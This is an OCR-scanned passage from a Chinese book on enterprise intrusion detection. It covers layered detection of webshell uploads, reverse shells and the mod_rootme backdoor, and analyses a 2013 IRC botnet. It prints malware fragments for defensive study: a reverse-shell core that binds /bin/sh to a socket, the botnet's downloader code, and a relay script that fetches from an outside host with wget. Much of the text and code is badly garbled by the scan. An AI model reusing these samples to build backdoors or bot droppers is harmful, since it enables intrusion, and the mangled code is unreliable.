业务逻辑
款诈\数据盗取
CGI函数
PHPisqlinjectwebshell
JAVA(RCEwebshell.
OtherCGTwebshell...
系统API
LIBClexploit
LIBPCAPI
sniferiarpspo
LIBXXX
OtherLIB
Linux内核
图8-28战场纵深视图
2.高维防守
当攻防双方在同一纬度时，攻击者会有很多途径实现攻击，而防守策略必须不断地叠
加来封堵，往往疲于奔命。我认为像杀毒软件或各色IPSIDS那样不断累加特征码的方式
在互联网公司安全团队有限的人力资源条件下，去做这么一件需长年累月投入人力且收效
未必很好的事是非常不可取的。
如何让策略足够完备呢，我认为基于系统的机制、CGI和协议规范是较为靠谱的，比
我们不断用新规则、新策略去为之前的策略打“补丁”来靠谱的多。因为一切攻击与防守
所需的基本功能与基本逻辑基于此。
---
## Page 183
第8章入侵感知体系171
从图8-31可以看到无论什么人侵行为，都对应着更高一纬度的系统功能和能力支持
在我们的主场，为什么放着这些有利的条件不用呢。与攻击者针尖对麦芒地在低纬度对抗，
犹如遭受了《三体》中的“降维攻击”，是不明智的做法。
在制定策略前，先分析一下人侵场景中如“webshell上传“在各个纬度都有哪些事件
发生，如图8-29所示。
•RFC1867
fopen@ibphp
*open@libc
+OPEN@SYSCAL
(Form-based
Fille Upload in
•fwrite@libphp.
S0
•write@libc
*IN_OPEN@inot
L
HTML)
*rename@libc
50
A!
d_file@libphp
图8-29webshell上传在各纬度事件
3.策略实践
梳理清楚了“webshell上传”这个场景在各纬度的技术细节，如何制定不易绕过的策
略就相对容易了。
网络层，不用去考虑添加N个规则去应对诸如”XXeditor上传漏洞”、“XXCMS上传
漏洞“：要知道无论什么漏润和哪种黎琐的攻击，总是要符合HTTP协议，那从高纬度的
HTTP协议入手，“检测符合RFC1867标准的上传CGI行为”：
Length:
T
CGI层，无论什么CGI漏洞导致的上传，漏洞代码儿乎都有用fopen等写文件的操作。
这里我们关注fopen等写CGI文件的API事件即可；
[14031597643:
系统用户态，通过检测系统层面的API调用行为，比如写模式openCGI（创建），来发
---
## Page 184
172技术篇
现webshell上传儿乎对于攻击者来说儿乎很难绕过检测了，除非websvr直接是root启动且
能加载任意代码：
[13:t 10657]eabeebchelluplosd L/us/o
系统内核态，通过内核inotify事件来发现CGI创建行为，在这一层我们甚至不担心
root启动的websvr加载恶意代码带来的可能的逃逸检测，至少在完成后续的攻击之前的可
疑行为必定被发现：
总结之后，我们的检测系统如图8-30所示，有了立体纵深结构
RFC1867
业务逻辑
CGI
策略检测
LIBXX
HIPS
Linuxkemel
图8-30高维防守
---
## Page 185
第8章入侵感知体系173
4.近身防守
前面看到，通常供攻击者施展的漏洞利用或攻击渠道能做的事情毕竞有限，防守方在
高一纬度对事件的观察与检测让攻击方很难逃逸。但也要注意一点，对入侵\漏洞场景的细
致分析，以及人侵场景关键环节的提炼也是策略制定的关键，否则也会陷人不断为旧策略
打补丁的尴尬境地。
要解决一个人侵场景，在制定策略之前做好足够的分析并提炼其最核心的技术点，贴
近此特征制定策略效果就非常好，且不易被绕过。下面选择两个Linux系统常见的木马场
景和案例来说明。
熟悉恶意代码取证的同学应该清楚常见的反连木马，“核心’代码部分一般是这样的：
connect (sockfd, (struct sockaddr *)&cliaddr, sizeof (struct sockaddr))/
dup2 (sockfd, 1) ;
dup2 (sockfd, 2) ;
execve (*/bin/sh*, "sh*, envp) 
那我们检测十分简单，通常一个bash进程是不会有网络连接的，所以检测策略是bash
的STDIN STDOUT绑定了socket则为木马，如图8-31所示。
本马 shell(bashish..)
· STDINSTDOUT重定向
到 SOCKET
普通 bash’sh.
·无网络连接
图8-31常规Linux反连shell检测思路
但有一些老练的攻击者的代码则不会那么偷懒，臂如mod_rootme这个木马，为了复用
Apache的监听端口以及获得root权限的shell，在代码逻辑上做了很多精巧的变换组合，使
得检测不可能象前述那类普通木马一样方便。TSRC官微曾经有分享过（http:/.qq.com/p/
t/330573116082464）如何发现mod_rootme这类极为隐蔽的后门，如图8-32所示。再狡猾
的后门也有异于系统正常行为的地方，根据异常行为建立策略是相比那类签名特征更为靠
请的检测手段
---
## Page 186
174技术篇
HTTPD
libnss_dns-2.4.so
libnss_files-2.4.so
>=2个root权限httpd进程
=66个管道
伪终端
图 8-32Mod_rootme 检测思路
安全设备与检测系统布置在合适的纬度使得防守处于非常有利的位置，同时尽可能的
提炼入侵场景的关键环节，则是检测思想的精髓
我认为甲方安全团队尽量避免做看似大而全，针对每一类漏洞和黑客攻击手法制定策
略的思路。面要针对自身业务特点，分析其主要风险，针对性的制定策略。将有限的资源
用于对抗清晰的风险场景，是更为可取且有效率的事。
8.7
数据链生态—僵尸网络
接人了互联网的业务被攻击是难免的，尽早检测，做好事件溯源分析和情报共享，
及时控制其蔓延危害网络，亡羊补牢为时未晚。特别是应对类似于僵户网络这类攻击非
常有效。
8.7.1僵户网络传播
botnet或蜗虫，一个重要的特征就是自动传播能力，这里介绍2类常见的传播方式。
口漏洞传播一为了快速获取大量被控僵户肉鸡，攻击者会及时更新攻击模块。笔者有
---
## Page 187
第8章入侵感知体系175
一个经验，每次在检测到有新一波攻击手法时，去查查最近公开的漏洞或许就能看
到。同时作为僵尸网络大范围的攻击行为（甚至是漫无目的的），几乎可以预见到的是
他的行为和攻击方式100%会被侦察到，所以他们不会使用最新0day。用1day是权
衡两者最经济的方式，并且偏爱能直接执行命令的类型，警如：struts2RCE、JBoss
DeploymentFileRepository WAR Deployment、 CVE-2012-1823 (PHP-CGI RCE) 等。
口自动化攻击工具一—漏洞常有，面装有存在漏润的软件的服务器不常有，但人的弱
点总是避免不了的。比如弱口令问题，现如今最古老的弱口令猜解攻击依然存在，
sshiftprdpitelnet 等等，加之tomcat 管理后台等各种口令。现在越来越快的网速，越
来越强的硬件性能使之效率越来越高。
8.7.2僵户网络架构
这里分析一个2013年内捕获的僵户网络，其功能特点非常具有代表性。以下是其各功
能模块分析。
1.下载者
负责接收控制者指令，下载更新功能模块。如下所示：
Send(sock2,*GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent:
：K:80rnAccept:inage/gif, image/x-xbitmap, inage/jpeg,inage/pjpeg,inag
en\r\rAecept-Charset: ieo-8859-1, *,utf-8\z\n\r\n,buf+i+1, buf);
Send(sock,NOTICE %：Recenving file.\n,sender);
file=fopen(argv[2],~wb"):
while(1)-{
int i:
（（i=recv（sock2,bufn,4096,0））<= 0） break
if （i<4096) bufm[i]=0
for （d=0;d<i;d++)if（!strncnp (bufn+d,"\r\nr\n,4)){
for (d+=4;d<i:d++) fputc (bufn[d], file);
goto done:
done:
Send(sock,“NoTICE %s :Saved ae %s\n,sender,argv[2])
2.传播中继站
僵尸网络制造者为了隐蔽自已也避免整个botnet被捣毁，不可能将传播源集中到一个
地方，所以常常在肉鸡上建立中继站。
---
## Page 188
176技术篇
在这个案例中，它会搭建一个简易的webserver来实现。
1/bin/sh
f /tap/- ICEunix/-1og/htdocz/httpd ]: then
ins_ht. sh*
nkdir/tmp/.ICEumix/-1og/htdocz/
vgetht+p://umix4lyfe.org/eitweb/datkhttpd/b1ob_p1sin/HEAD:/darkhttpd.
wget http://
3.被控端
作为一个僵户愧最主要就是“听话”，此次案例它采用的是irc通道。这里攻击者预
设了2个域名作为Server通信地址，而域名解析到的IP是可随时更换的，ircbot随机连接
到任一个Server。
//Charnel to join
blol
char *zer
nt niunservers=
// List the zervers in that format, alwayz end in (void)
vo1d.)0
此ircbot有多个基础功能，如DDoS、执行命令、自杀、更换Server、切换静默状态
(Disables all packeting) 等。
sdhelfsfo,arndtuta
*Speeisl packster thst rsst be blseid br nost f:
▪ Jon sdmmnced ty flosdes thst ei11 les11 scct at
Sendao,*soTtCE x 3CK nick
= Ghesteg the rics9 of the clsentis', sede).zleep (
Send!
Send(roek, TCE sz PTSAEL
Phrsb1er sll parireting fros thsz
eep()
Enablez sl1 packetsrg fros thsz elient'in', zemdes
F 
Smdcky,“TCE kHELP
Dp] ay thrs'sendee)
Sand(eeck, *N)TICE %r:IBC (eenssnd
Send: thz cound to then
---
## Page 189